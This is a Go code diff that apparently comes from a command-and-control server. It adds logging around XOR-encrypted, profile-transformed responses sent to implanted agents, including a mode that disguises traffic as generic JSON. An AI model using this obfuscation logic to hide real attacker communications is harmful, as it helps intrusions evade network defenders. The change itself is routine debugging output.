@@ -266,12 +266,16 @@ func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[s
 	// Check if we should apply response transforms
 	if responseProfile != nil && responseProfile.Data != nil && len(responseProfile.Data.Transforms) > 0 {
 		// Apply transforms to the encrypted data
+		// Uses static profile XOR key - agent has matching key embedded at build time
 		xforms := convertConfigTransforms(responseProfile.Data.Transforms)
+		log.Printf("[GetRequest] Applying %d response transforms for client %s", len(xforms), clientID)
+
 		result, err := transforms.Apply(encryptedData, xforms)
 		if err != nil {
-			log.Printf("[GetRequest] Failed to apply response transforms: %v", err)
+			log.Printf("[GetRequest] ERROR: Failed to apply response transforms: %v - falling back to legacy", err)
 			// Fall back to non-transformed response
 		} else {
+			log.Printf("[GetRequest] Response transforms applied successfully, output size: %d bytes", len(result.Data))
 			encryptedData = result.Data
 
 			// Add padding length headers if random transforms were used
@@ -315,6 +319,7 @@ func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[s
 	}
 
 	// Legacy: No transforms - use JSON wrapping with random keys for obfuscation
+	log.Printf("[GetRequest] Using LEGACY JSON-wrapped response (no transforms or transform error)")
 	// Generate random keys to obfuscate the response structure
 	// Use 2-4 character keys that look like generic JSON
 	keys := generateRandomKeys()
